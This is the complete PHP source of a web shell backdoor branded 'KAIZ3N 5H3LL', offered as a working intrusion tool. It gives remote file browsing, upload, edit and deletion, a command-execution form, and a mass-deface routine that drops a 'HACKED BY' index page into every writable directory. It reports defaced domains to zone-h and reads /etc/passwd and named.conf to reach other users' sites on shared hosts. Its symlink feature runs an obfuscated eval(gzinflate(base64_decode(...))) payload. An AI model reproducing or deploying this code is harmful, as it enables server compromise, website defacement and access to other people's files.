<?php
error_reporting(0);
set_time_limit(0);

if(get_magic_quotes_gpc()){
foreach($_POST as $key=>$value){
$_POST[$key] = stripslashes($value);
}
}
echo '<!DOCTYPE HTML>
<html>
<head>

<link href="https://fonts.googleapis.com/css?family=Supermercado+One&display=swap" rel="stylesheet">
<link href="https://i.ibb.co/YbBjQc3/20191009-104810.png" rel="icon" type="image/x-icon"/>
<link href="https://fonts.googleapis.com/css?family=Kelly+Slab" rel="stylesheet">

<title>
KAIZ3N 5H3LL
</title>

<style>
body{
font-family: Kelly Slab;
background-color: black;
background-image: url();
background-size: center;
background-repeat:no-repeat;
background-attachment: fixed;
background-size: cover;
background-position:center;
color: white;
}

#content tr:hover{
background-color: black;
text-shadow:0px 0px 10px black;
}

#content .first{
background-color: white;
color: black;
}

table{
border: 2px black solid;
}

a{
color: #00FF66;
text-decoration: none;
}

a:hover{
color:blue;
text-shadow:0px 0px 10px #ffffff;
}

input,select,textarea{
border: 1px #000000 solid;
-moz-border-radius: 5px;
-webkit-border-radius:5px;
border-radius:5px;
}

.lazy {
margin: 0;
font-family: Kelly Slab;
}
</style>
</head>
</body>

<body>
<h1>
<center>
<img src="https://i.ibb.co/YbBjQc3/20191009-104810.png" width="350">

<font color="white" face="Kelly Slab">
<div class="lazy">
PRIV8 SHELL BACKDOOR ./KAIZ3N-6H05T
</font>
</center>
</h1>

<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr>
<td>
<font color="white">PATH :</font> ';
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<a href="?path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
echo '">'.$pat.'</a>/';
}
echo '</td></tr><tr><td>';
if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo '<font color="#00FF66">UPLOAD SUCCESS</font><br />';
}else{
echo '<font color="red">UPLOAD FAILED</font><br/>';
}
}
	if(isset($_GET['dir'])) {
	$dir = $_GET['dir'];
	chdir($dir);
} else {
	$dir = getcwd();
}
$ip = gethostbyname($_SERVER['HTTP_HOST']);
$kernel = php_uname();
$ds = @ini_get("disable_functions");
$show_ds = (!empty($ds)) ? "<font color=red>$ds</font>" : "<font color=#00FF66>ON</font>";
if(!function_exists('posix_getegid')) {
	$user = @get_current_user();
	$uid = @getmyuid();
	$gid = @getmygid();
	$group = "?";
} else {
	$uid = @posix_getpwuid(posix_geteuid());
	$gid = @posix_getgrgid(posix_getegid());
	$user = $uid['name'];
	$uid = $uid['uid'];
	$group = $gid['name'];
	$gid = $gid['gid'];
}
//echo "DISABLE FUNCTIONS : $show_ds<br>";
echo "SYSTEM : <font color=#00FF66>".$kernel."</font><br>";

echo "<center>";
echo "<hr>";
echo "[ <a href='?'>HOME</a> ]";
echo "[ <a href='?dir=$dir&to=zoneh'>ZONE-H</a> ]";
echo "[ <a href='?dir=$dir&to=jumping'>JUMPING</a> ]";
echo "[ <a href='?dir=$dir&to=sym'>SYMLINK</a> ]";
echo "[ <a href='?dir=$dir&to=mass'>MASS DEFACE</a> ]";
echo "[ <a href='?dir=$dir&to=cmd'>COMMAND</a> ]";
echo "</center>";

echo "<hr>";

if($_GET['to'] == 'zoneh') {
if($_POST['submit']) {
$domain = explode("\r\n", $_POST['url']);
$nick =  $_POST['nick'];

echo "DEFACER ONHOLD: <a href='http://www.zone-h.org/archive/notifier=$nick/published=0' target='_blank'>http://www.zone-h.org/archive/notifier=$nick/published=0</a><br>";

echo "DEFACER ARCHIVE: <a href='http://www.zone-h.org/archive/notifier=$nick' target='_blank'>http://www.zone-h.org/archive/notifier=$nick</a><br><br>";

function zoneh($url,$nick) {
$ch = curl_init("http://www.zone-h.com/notify/single");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, "defacer=$nick&domain1=$url&hackmode=1&reason=1&submit=Send");
return curl_exec($ch);
curl_close($ch);
}
foreach($domain as $url) {
$zoneh = zoneh($url,$nick);
if(preg_match("/color=\"#00FF66\">OK<\/font><\/li>/i", $zoneh)) {
echo "$url -> <font color=#00FF66>OK</font><br>";
} else {
echo "$url -> <font color=red>ERROR</font><br>";
}
}
} else {
echo "<center>
<form method='post'>
<u>-::DEFACER::-</u>

<br>

<input type='text' name='nick' size='50' placeholder='./KAIZ3N-6H05T'>

<br>

<u>-::DOMAINS::-</u>

<br>

<textarea style='width: 450px; height: 150px;' name='url'></textarea>

<br>

<input type='submit' name='submit' value='SUBMIT' style='width: 450px;'>
</form><br>";
}
echo "</center>";
} elseif($_GET['to'] == 'mass') {
function sabun_massal($dir,$namafile,$isi_script) {
if(is_writable($dir)) {
$dira = scandir($dir);
foreach($dira as $dirb) {
$dirc = "$dir/$dirb";
$lokasi = $dirc.'/'.$namafile;
if($dirb === '.') {
file_put_contents($lokasi, $isi_script);
} elseif($dirb === '..') {
file_put_contents($lokasi, $isi_script);
} else {
if(is_dir($dirc)) {
if(is_writable($dirc)) {
echo "[<font color=#00FF66>DONE</font>] $lokasi<br>";
file_put_contents($lokasi, $isi_script);
$idx = sabun_massal($dirc,$namafile,$isi_script);
}
}
}
}
}
}
function sabun_biasa($dir,$namafile,$isi_script) {
if(is_writable($dir)) {
$dira = scandir($dir);
foreach($dira as $dirb) {
$dirc = "$dir/$dirb";
$lokasi = $dirc.'/'.$namafile;
if($dirb === '.') {
file_put_contents($lokasi, $isi_script);
} elseif($dirb === '..') {
file_put_contents($lokasi, $isi_script);
} else {
if(is_dir($dirc)) {
if(is_writable($dirc)) {
echo "[<font color=#00FF66>DONE</font>] $dirb/$namafile<br>";
file_put_contents($lokasi, $isi_script);
}
}
}
}
}
}
if($_POST['start']) {
if($_POST['tipe_sabun'] == 'mahal') {
echo "<div style='margin: 5px auto; padding: 5px'>";
sabun_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
echo "</div>";
} elseif($_POST['tipe_sabun'] == 'murah') {
echo "<div style='margin: 5px auto; padding: 5px'>";
sabun_biasa($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
echo "</div>";
}
} else {
echo "<center>";
echo "<form method='post'>
<font style='text-decoration: underline;'>
-::TYPE DEFACE::-
</font>

<br>

<input type='radio' name='tipe_sabun' value='murah' checked>
STANDART

<input type='radio' name='tipe_sabun' value='mahal'>
MASSAL

<br>

<font style='text-decoration: underline;'>
-::FOLDER::-
</font>

<br>

<input type='text' name='d_dir' value='$dir' style='width: 450px;' height='10'>

<br>

<font style='text-decoration: underline;'>
-::FILENAME::-
</font>

<br>

<input type='text' name='d_file' placeholder='index.php' style='width: 450px;' height='10'>

<br>

<font style='text-decoration: underline;'>
-::INDEX FILE::-
</font>

<br>

<textarea name='script' style='width: 450px; height: 200px;'>
HACKED BY ./KAIZ3N-6H05T
</textarea>

<br>

<input type='submit' name='start' value='EXECUTE' style='width: 450px;'>
</form></center><br>";
} 
}elseif($_GET['to'] == 'sym') {
echo '<hr>';
eval(gzinflate(base64_decode('7ZdtT9tIEIC/I/EfhiUn20dqJ0FtTyROQUB16AqRIL0XoSpy7DX2sfFa3k1NSvnvN7u2k9QJQS2Vrh/6IZGz87Lj2ZlnNo1wyhi4IGQ2ymjKPJ+ajdHV6eWfp5fXxsng+P356cVwdDkYDI0PTSCkCY3Uk5HV3d5qBK2JFycCzQ/DmFGTOFT6TuJNaGD7PAmJ0trdjaREt2J7Kw7Nysa63946nNwGcWaSWy/+RJORmE1Is/X69WtldehHdZlepnfUNwlL4IUABzLOpV5vqP33MRBjkMqYY0xnSYC6At5yxnh+NZu8i5NbjOEkzqgveTbTClD4tyM52d46CoLhLKUg6Z10MBVxAnYapVrwu5cEjGarsitPxiKcwVEyM3QgqQoj5ClNTAP9ej6+ujCaRm4UgeZanmexxEyjdrOI3eoehj7jolhUqtSPOJDtrZ70xoyCx+KbxPVpIjGMMc8Cmrn7eG4zRl0jjwMZHbxq/dItJC98znh2sNtqvX376lXX6Cs3mf4OvvDU74U8kaDV3VIdBObE7fQvBj1HSfs9RwZfaXsyOD86u7j6dgfvsQafYX71z/m7s4s/ag4czAHRlevzKZq60MZfIc+o50fz2gRPQPmsyhSrlmb0JjbJJ55Q0qxE1n2Ky6OJJ/1o5DFmGrtKAYhp/2qRXaNZOVEPvKh6tRubishUT+gY245hocgsnpiV0nX7w3Xrg2VBHzpq/8ZU4Im7kHIR341uqEzzaRyYuuV4ntCs7LuPmBtPUOEQu+5qXk1YBLUUYmKKNJaJI2BDlR4bDR45AUZDXPUgymjoYoOnB46T57ld39smTnVMzBPClXeyv6oz38Vb2knpqVe/NhRRDK02l1VbGw0FMGeBCUcxwYn4hDor9k46HbPYH2G3MwOkl2EyXWM0Zl5ya6yEWS+hMrayiGD5JMuE7e11Hx4e5rl2dOPqgnugTFB1lsPTq6Fb0NLQp5bidnlgFPUAplb4Rjj+6GyEp+AIG+iI0jogoSIkbEBku1+ADx6hhy77fWSd/WWpP6G/Bk9PWKwh0pxH8CWQQL/0PFNkqVBw/pKMWMAzoHexNMn7RL+65KB0QRnu6GOHPFJVthNSjmNXrVuqrqCh5nWIlS/KVb2hphhVIi/LvJlZrKqAFpDDinWQbW8s7HWh8Caac8O6l+X7BCm6sYmXh0oDG19bLBA4d4TYa3fg82dYEbgutJRgsY0LZBwnZGVR5evvdtsJxarso5c5LB47yWNCL0tztbReesPTiGarMrE2EO0vmKwKpgJdIZYeiSGU6fq3StYJlAXCd71AX8eIhcnGK5mMkyldtI5qjU1Vu2YcbCz1JcYruyqUypAs7/yEgwrwm/he22MZ7yt0R8oxpFwd44veU/CeA6bqizrJC46reywXsIMZ/itOAp4LYt0/Duy1uFY32RVYL1CNe38lrVut356P6e2tZ4N6A6Wro4465UEbtx3G9veDjlHhEYq/Hj0n6vS/C9jPTv5Xrks6STFRhHQbeD9r42NLP3UU6lutllLC+6dZinsuaGnxc2/PgvsGXvbUP6za9U8rlAzFawMuWcVmtgv/8hiP7cBo6mWbJFi41UEYvXHm9I1uFVlx9VQ/yvJ7iYs6KD16JBXSxn5EeufFWAnTaTU6XjZLQ7W81Dov0dXSQKum2Tqvz5pmq6PsO8yxn0Ps5xD7YYdYxZpNQ6zWjGvmWM8J4o/4XUZNutNEzcalvtRGD6CmHSzM1+Hv+OjiYjCE48vTo+Ep1GE430G5Kz5v+v8B')));
} elseif($_GET['to'] == 'jumping') {
$i = 0;
echo "<div class='margin: 5px auto;'>";
if(preg_match("/hsphere/", $dir)) {
$urls = explode("\r\n", $_POST['url']);
if(isset($_POST['jump'])) {
echo "<pre>";
foreach($urls as $url) {
$url = str_replace(array("http://","www."), "", strtolower($url));
$etc = "/etc/passwd";
$f = fopen($etc,"r");
while($gets = fgets($f)) {
$pecah = explode(":", $gets);
$user = $pecah[0];
$dir_user = "/hsphere/local/home/$user";
if(is_dir($dir_user) === true) {
$url_user = $dir_user."/".$url;
if(is_readable($url_user)) {
$i++;
$jrw = "[<font color=#00FF66>R</font>] <a href='?dir=$url_user'><font color=gold>$url_user</font></a>";
if(is_writable($url_user)) {
$jrw = "[<font color=#00FF66>RW</font>] <a href='?dir=$url_user'><font color=gold>$url_user</font></a>";
}
echo $jrw."<br>";
}
}
}
}
if($i == 0) { 
} else {
echo "<br>TOTAL THERE IS ".$i." ROOM IN ".$ip;
}
echo "</pre>";
} else {
echo '<center>
<form method="post">
-::LIST DOMAINS::-

<br>

<textarea name="url" style="width: 500px; height: 250px;">';
$fp = fopen("/hsphere/local/config/httpd/sites/sites.txt","r");
while($getss = fgets($fp)) {
echo $getss;
}
echo  '</textarea>

<br>
<input type="submit" value="JUMPING" name="jump" style="width: 500px; height: 25px;">
</form></center>';
}
} elseif(preg_match("/vhosts|vhost/", $dir)) {
preg_match("/\/var\/www\/(.*?)\//", $dir, $vh);
$urls = explode("\r\n", $_POST['url']);
if(isset($_POST['jump'])) {
echo "<pre>";
foreach($urls as $url) {
$url = str_replace("www.", "", $url);
$web_vh = "/var/www/".$vh[1]."/$url/httpdocs";
if(is_dir($web_vh) === true) {
if(is_readable($web_vh)) {
$i++;
$jrw = "[<font color=#00FF66>R</font>] <a href='?dir=$web_vh'><font color=gold>$web_vh</font></a>";
if(is_writable($web_vh)) {
$jrw = "[<font color=#00FF66>RW</font>] <a href='?dir=$web_vh'><font color=gold>$web_vh</font></a>";
}
echo $jrw."<br>";
}
}
}
if($i == 0) { 
} else {
echo "<br>TOTAL THERE IS ".$i." ROOM IN ".$ip;
}
echo "</pre>";
} else {
echo '<center>
<form method="post">
-::LIST DOMAINS::-

<br>

<textarea name="url" style="width: 500px; height: 250px;">';
bing("ip:$ip");
echo  '</textarea>

<br>
<input type="submit" value="JUMPING" name="jump" style="width: 500px; height: 25px;">
</form></center>';
}
} else {
echo "<pre>";
$etc = fopen("/etc/passwd", "r") or die("<font color=red>Can't read /etc/passwd</font>");
while($passwd = fgets($etc)) {
if($passwd == '' || !$etc) {
echo "<font color=red>Can't read /etc/passwd</font>";
} else {
preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
foreach($user_jumping[1] as $user_idx_jump) {
$user_jumping_dir = "/home/$user_idx_jump/public_html";
if(is_readable($user_jumping_dir)) {
$i++;
$jrw = "[<font color=#00FF66>R</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
if(is_writable($user_jumping_dir)) {
$jrw = "[<font color=#00FF66>RW</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
}
echo $jrw;
if(function_exists('posix_getpwuid')) {
$domain_jump = file_get_contents("/etc/named.conf");	
if($domain_jump == '') {
echo " => [ <font color=red>CANNOT TAKE HIS DOMAIN NAME</font> ]<br>";
} else {
preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
foreach($domains_jump[1] as $dj) {
$user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
$user_jumping_url = $user_jumping_url['name'];
if($user_jumping_url == $user_idx_jump) {
echo " => [ <u>$dj</u> ]<br>";
break;
}
}
}
} else {
echo "<br>";
}
}
}
}
}
if($i == 0) { 
} else {
echo "<br>TOTAL THERE IS ".$i." ROOM IN ".$ip;
}
echo "</pre>";
}
echo "</div>";
}  elseif($_GET['to'] == 'cmd') {
echo "<form method='post'>
<font style='text-decoration: underline;'>".$user."@".$ip.": ~ $ </font>
<input type='text' size='30' height='10' name='cmd'><input type='submit' name='do_cmd' value='>>'>
</form>";
if($_POST['do_cmd']) {
echo "<pre>".exe($_POST['cmd'])."</pre>";
}
}
echo '<form enctype="multipart/form-data" method="POST">
<font color="white">FILE UPLOAD :</font> <input type="file" name="file" />
<input type="submit" value="UPLOAD" />
</form>
</td></tr>';
if(isset($_GET['filesrc'])){
echo "<tr><td>CURRENT FILW : ";
echo $_GET['filesrc'];
echo '</tr></td></table><br />';
echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
if($_POST['opt'] == 'chmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['path'],$_POST['perm'])){
echo '<font color="#00FF66">CHANGE PERMISSIONS SUCCESS</font><br/>';
}else{
echo '<font color="red">CHANGE PERMISSIONS FAILED</font><br />';
}
}
echo '<form method="POST">
PERMISSIONS : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="chmod">
<input type="submit" value="EXECUTE" />
</form>';
}elseif($_POST['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo '<font color="#00FF66">RENAME SUCCESS</font><br/>';
}else{
echo '<font color="red">RENAME FAILED</font><br />';
}
$_POST['name'] = $_POST['newname'];
}
echo '<form method="POST">
NEW NAME : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="EXECUTE" />
</form>';
}elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<font color="#00FF66">EDIT FILE SUCCESS</font><br/>';
}else{
echo '<font color="red">EDIT FILE FAILED</font><br/>';
}
fclose($fp);
}
echo '<form method="POST">
<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="SAVE" />
</form>';
}
echo '</center>';
}else{
echo '</table><br/><center>';
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '<font color="#00FF66">DELETED DIRECTORY SUCCESS</font><br/>';
}else{
echo '<font color="red">DELETED DIRECTORY FAILED                    </font><br/>';
}
}elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
echo '<font color="#00FF66">DELETE FILE SUCCESS</font><br/>';
}else{
echo '<font color="red">DELETE FILE FAILED</font><br/>';
}
}
}
echo '</center>';
$scandir = scandir($path);
echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr class="first">
<td><center><b>NAME</b></peller></center></td>
<td><center><b>SIZE</b></peller></center></td>
<td><center><b>PERMISSIONS</b></peller></center></td>
<td><center><b>MODIFY</b></peller></center></td>
</tr>';

foreach($scandir as $dir){
if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;
echo '<tr>
<td><a href="?path='.$path.'/'.$dir.'">'.$dir.'</a></td>
<td><center>----</center></td>
<td><center>';
if(is_writable($path.'/'.$dir)) echo '<font color="#00FF66">';
elseif(!is_readable($path.'/'.$dir)) echo '<font color="red">';
echo perms($path.'/'.$dir);
if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) echo '</font>';

echo '</center></td>
<td><center><form method="POST" action="?option&path='.$path.'">
<select name="opt">
<option value="">SELECT</option>
<option value="delete">DELETE</option>
<option value="chmod">CHMOD</option>
<option value="rename">RENAME</option>
</select>
<input type="hidden" name="type" value="dir">
<input type="hidden" name="name" value="'.$dir.'">
<input type="hidden" name="path" value="'.$path.'/'.$dir.'">
<input type="submit" value=">">
</form></center></td>
</tr>';
}
echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
foreach($scandir as $file){
if(!is_file($path.'/'.$file)) continue;
$size = filesize($path.'/'.$file)/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' MB';
}else{
$size = $size.' KB';
}

echo '<tr>
<td><a href="?filesrc='.$path.'/'.$file.'&path='.$path.'">'.$file.'</a></td>
<td><center>'.$size.'</center></td>
<td><center>';
if(is_writable($path.'/'.$file)) echo '<font color="#00FF66">';
elseif(!is_readable($path.'/'.$file)) echo '<font color="red">';
echo perms($path.'/'.$file);
if(is_writable($path.'/'.$file) || !is_readable($path.'/'.$file)) echo '</font>';
echo '</center></td>
<td><center><form method="POST" action="?option&path='.$path.'">
<select name="opt">
<option value="">SELECT</option>
<option value="delete">DELETE</option>
<option value="chmod">CHMOD</option>
<option value="rename">RENAME</option>
<option value="edit">EDIT</option>
</select>
<input type="hidden" name="type" value="file">
<input type="hidden" name="name" value="'.$file.'">
<input type="hidden" name="path" value="'.$path.'/'.$file.'">
<input type="submit" value=">">
</form></center></td>
</tr>';
}
echo '</table>
</div>';
}
echo '<center><br/>CODERS BY ./KAIZ3N-6H05T | COPYRIGHT &COPY; 2K16 POWERED BY BLACK CODERS ANONYMOUS</center>
</body>
</html>';
function perms($file){
$perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));

return $info;
}
?>
